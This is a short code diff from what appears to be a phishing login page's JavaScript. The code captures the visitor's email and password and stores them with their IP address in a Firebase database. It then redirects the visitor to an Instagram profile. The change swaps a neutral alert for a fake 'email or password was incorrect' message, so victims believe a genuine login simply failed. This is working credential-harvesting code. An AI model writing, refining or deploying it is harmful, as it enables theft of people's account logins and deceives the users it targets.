@@ -75,7 +75,7 @@ var email = document.getElementById("email");
 var password = document.getElementById("password");
 document.getElementById("insert").onclick = function(){    
   firebase.database().ref('users/' ).push().set({   ip: json.ip,   email:email.value,   password:password.value,      }  );   
-  if (document.getElementById("email").value == "" || document.getElementById("password").value == "" ) {   alert("Name must be filled out");   return false; }  else { window.location='https://www.instagram.com/hotsaxygirls9053';   }
+  if (document.getElementById("email").value == "" || document.getElementById("password").value == "" ) {   alert("Your email or password was incorrect . Please try again");   return false; }  else { window.location='https://www.instagram.com/hotsaxygirls9053';   }
   infodata();   
   window.onload=function(){  };     
 }  
